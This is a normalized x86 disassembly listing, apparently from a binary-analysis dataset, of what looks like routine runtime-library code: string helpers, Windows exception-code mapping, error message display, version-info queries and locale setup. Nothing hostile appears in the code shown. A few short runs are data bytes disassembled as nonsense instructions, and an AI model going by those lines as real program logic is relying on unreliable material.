mov eax edi
mov edx r-xdata
call sub_404174
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0xc ]
mov dl [ esi + ebx - 0x1 ]
call sub_404094
mov edx [ ebp - 0xc ]
mov eax edi
call sub_404174
lea eax [ ebp - 0x14 ]
mov dl [ esi + ebx - 0x1 ]
call sub_404094
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_404174
sub_40ae0e
0x8900000f 0xfc45
mov eax esi
call sub_40416c
cmp ebx eax
jle r-xdata
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40af0d
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_403ed0
retn
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_4083a4
test eax eax
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_4043cc
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_404174
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40bdac
mov [ ebp - 0x4 ] eax
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_4083a4
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404174
inc ebx
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_4083a4
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404174
add ebx 0x3
jmp r-xdata
inc ebx
mov al [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_404174
inc ebx
jmp r-xdata
mov eax edi
mov edx r-xdata
call sub_404174
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0x14 ]
mov dl [ esi + ebx - 0x1 ]
call sub_404094
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_404174
sub_40af70
push ebp
mov ebp esp
add esp 0xfffffba8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
push 0x1c
lea eax [ ebp - 0x330 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x320 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax ebx
call sub_40af64
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ ebp - 0x32c ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x212 ]
mov dl 0x5c
call sub_40bf70
mov edx eax
inc edx
lea eax [ ebp - 0x10d ]
mov ecx 0x104
call sub_4082c8
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
sub ebx [ ebp - 0x32c ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x312 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_404f18
push eax
call LoadStringA
lea edx [ ebp - 0x458 ]
mov eax [ esi ]
call sub_403040
lea eax [ ebp - 0x458 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x4
lea eax [ ebp - 0x10d ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x348 ] eax
mov [ ebp - 0x344 ] 0x5
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x33c ] 0x6
mov [ ebp - 0x338 ] edi
mov [ ebp - 0x334 ] 0x6
lea eax [ ebp - 0x358 ]
push eax
push 0x4
lea ecx [ ebp - 0x312 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408900
mov eax [ ebp - 0x4 ]
call sub_408264
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_40436c
mov ebx eax
mov eax ebx
call sub_408264
test eax eax
je r-xdata
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
mov edi r-xdata
sub_40b0f8
add esp 0xfffffbbc
push 0x400
lea ecx [ esp + 0x48 ]
call sub_40af70
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_404f18
push eax
call LoadStringA
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
call MessageBoxA
mov eax [ rw-data ]
call sub_402990
call sub_402834
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call CharToOemA
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4c ]
call sub_408264
push eax
lea eax [ esp + 0x50 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
add esp 0x444
retn
sub_40b1c0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_403f00
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_40b1fc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b256
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_408940
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403f00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b25d
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
add esp 0xfffffff0
call sub_4033fc
sub_40b25d
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_40b27c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_4059ac
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_40b2b8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b324
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_4059ac
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_408940
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403f00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b32b
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ed0
retn
add esp 0xfffffff0
call sub_4033fc
sub_40b32b
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_40b378
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_4028a8
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2b8
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
jmp r-xdata
inc ebx
mov [ eax + 0xc ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_40b3d8
fdiv [ ebx + 0xa0e0040 ]
push esp
inc ebp
js r-xdata
test bh bh
[ ebx - 0x3d ]
mov eax eax
jo r-xdata
loopne r-xdata
push edx
je r-xdata
pop ebp
cld
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40b4e8
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
pop es
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
push ebx
mov ebx edx
mov edx eax
dec dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059ac
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_403f44
jmp r-xdata
push ebx
mov eax edx
jmp sub_403864
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x16
jb r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1fc
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b4ef
lea eax [ ebp - 0x20 ]
call sub_403eac
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
and eax 0xff
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b1c0
mov edx eax
jmp r-xdata
jmp r-xdata
call sub_40b378
mov edx eax
sub_40b44c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40b4e8
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059ac
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_403f44
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1fc
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b4ef
lea eax [ ebp - 0x20 ]
call sub_403eac
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_40b53c
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_40b5d4
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
xor eax eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40b78f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059ac
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x168 ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x160 ] 0xb
mov [ ebp - 0x15c ] esi
mov [ ebp - 0x158 ] 0x5
lea eax [ ebp - 0x16c ]
push eax
push 0x2
lea edx [ ebp - 0x170 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x170 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1fc
mov ebx eax
push 0x105
lea eax [ ebp - 0x125 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] 0x5
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x125 ]
mov ecx 0x105
call sub_40411c
mov eax [ ebp - 0x150 ]
lea edx [ ebp - 0x14c ]
call sub_40817c
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x134 ] 0xb
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x12c ] 0x5
lea eax [ ebp - 0x148 ]
push eax
push 0x3
lea edx [ ebp - 0x154 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x154 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1fc
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b796
lea eax [ ebp - 0x170 ]
call sub_403eac
lea eax [ ebp - 0x154 ]
mov edx 0x3
call sub_403ed0
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_40b7a0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40b85b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40b53c
and eax 0xff
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b1c0
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
push ebp
call sub_40b5d4
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b862
lea eax [ ebp - 0x10 ]
call sub_403eac
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1fc
mov ebx eax
sub_40b87c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b27c
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b27c
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_40b86c
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_40b5bc
mov eax [ rw-data ]
mov [ eax ] sub_40b7a0
mov eax sub_40b508
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40b524
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_40b900
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
retn
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_4030f0
xor eax eax
mov [ rw-data ] eax
sub_40b980
add esp 0xffffff6c
mov [ esp ] 0x94
push esp
call GetVersionExA
test eax eax
je r-xdata
add esp 0x94
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_40411c
sub_40ba10
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_40bae6
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_403f44
lea eax [ ebp - 0x8 ]
call j_sub_404378#2
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_40436c
push eax
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40baed
lea eax [ ebp - 0x8 ]
call sub_403eac
retn
mov eax ebx
call sub_4026cc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_40bac9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_40436c
push eax
call GetFileVersionInfoA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4026ec
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
sub_40bafc
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop edi
pop esi
retn
cmp [ eax + edi ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov esi edi
dec esi
jmp r-xdata
mov al [ eax ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
mov ecx edi
sub ecx esi
and ecx 0x80000001
jns r-xdata
mov cl [ eax + esi ]
and ecx 0xff
bt [ rw-data ] ecx
jb r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
dec esi
mov al [ eax + edi ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov dl 0x2
jmp r-xdata
mov dl 0x1
sub_40bb74
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_40436c
mov edx esi
dec edx
call sub_40bafc
sub_40bbb0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40416c
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_40bbd8
pop esi
pop ebx
retn
mov eax ebx
call sub_40416c
mov esi eax
sub_40bbd8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
test esi esi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_40416c
cmp esi eax
jg r-xdata
mov edi esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
xor edi edi
cmp esi eax
jl r-xdata
mov dl [ ebx + eax - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
inc eax
mov edx eax
mov eax ebx
call sub_40bde8
jmp r-xdata
inc edi
cmp esi eax
jge r-xdata
sub_40bc30
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax edi
call sub_40416c
mov [ ebp - 0xc ] eax
mov esi 0x1
mov ebx 0x1
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx [ ebp - 0xc ]
jge r-xdata
inc esi
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_40bde8
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40bde8
dec eax
mov ebx eax
sub_40bcc0
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_40416c
cmp ebx eax
jg r-xdata
cmp ebx 0x1
jle r-xdata
mov [ esp ] ebx
cmp [ rw-data ] 0x0
je r-xdata
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
dec edx
mov eax esi
call sub_40bc30
dec ebx
cmp ebx [ esp + 0x4 ]
jg r-xdata
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_40416c
cmp eax [ esp ]
jg r-xdata
inc [ esp ]
jmp r-xdata
sub_40bd24
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_40416c
cmp ebx eax
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
call sub_40416c
mov ebx eax
mov [ esp ] ebx
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax esi
call sub_40bc30
mov eax esi
call sub_40416c
cmp eax [ esp ]
jge r-xdata
mov eax esi
call sub_40416c
mov [ esp ] eax
jmp r-xdata
sub_40bdac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ ebx + esi - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax ebx
call sub_40436c
add eax esi
dec eax
call sub_40bd84
sub_40bde8
push ebx
push esi
mov ebx edx
mov esi eax
lea eax [ ebx + 0x1 ]
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax esi
call sub_40436c
add eax ebx
dec eax
call sub_40bd84
add eax ebx
sub_40be24
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_40416c
cmp ebx eax
jg r-xdata
cmp [ esi + ebx - 0x1 ] 0x5c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40bb74
test al al
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_40be58
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_403f00
mov eax [ ebx ]
call sub_40416c
mov edx eax
mov eax [ ebx ]
call sub_40be24
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx r-xdata
call sub_404174
sub_40be98
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
xor edi edi
mov eax ebx
call sub_40436c
push eax
mov eax esi
call sub_40436c
mov ebp eax
mov eax ebp
pop edx
call sub_40bed0
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
sub edi ebp
inc edi
sub_40bed0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax esi
call sub_408264
mov [ esp ] eax
mov eax ebp
call sub_408264
mov edi eax
mov edx ebp
mov eax esi
call sub_4083fc
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov eax ebx
sub eax esi
mov edx [ esp ]
sub edx eax
cmp edi edx
jbe r-xdata
mov edx ebx
sub edx esi
mov eax esi
call sub_40bb98
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x2
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
push edi
push ebp
push edi
push ebx
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc ebx
mov edx ebp
mov eax ebx
call sub_4083fc
mov ebx eax
inc ebx
sub_40bf70
push ebx
push esi
mov ebx edx
mov edx ebx
call sub_40bf98
mov esi eax
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov esi eax
inc eax
mov edx ebx
call sub_40bf98
test eax eax
jne r-xdata
sub_40bf98
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_4083e8
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx edi
sub edx esi
mov eax esi
call sub_40bb98
sub al 0x1
jb r-xdata
je r-xdata
inc edi
jmp r-xdata
inc edi
mov edx ebx
mov eax edi
call sub_4083e8
mov edi eax
test edi edi
jne r-xdata
sub_40bfd8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
xor edx edx
push ebp
push sub_40c03c
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0x7 ]
push edx
push 0x1004
push eax
call GetLocaleInfoA
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0x7 ]
mov ecx 0x7
call sub_40411c
mov eax [ ebp - 0xc ]
push eax
call GetACP
mov edx eax
pop eax
call sub_407df4
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c043
lea eax [ ebp - 0xc ]
call sub_403eac
retn
sub_40c04c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
mov eax [ rw-data ]
call sub_40bfd8
push eax
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov al [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
mov al [ edi + esi + 0x6 ]
mov bl [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
and eax 0xff
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_40c0c4
push ebp
mov ebp esp
add esp 0xfffffe68
push ebx
push esi
push edi
mov [ rw-data ] 0x409
mov [ rw-data ] 0x9
mov [ rw-data ] 0x1
call GetThreadLocale
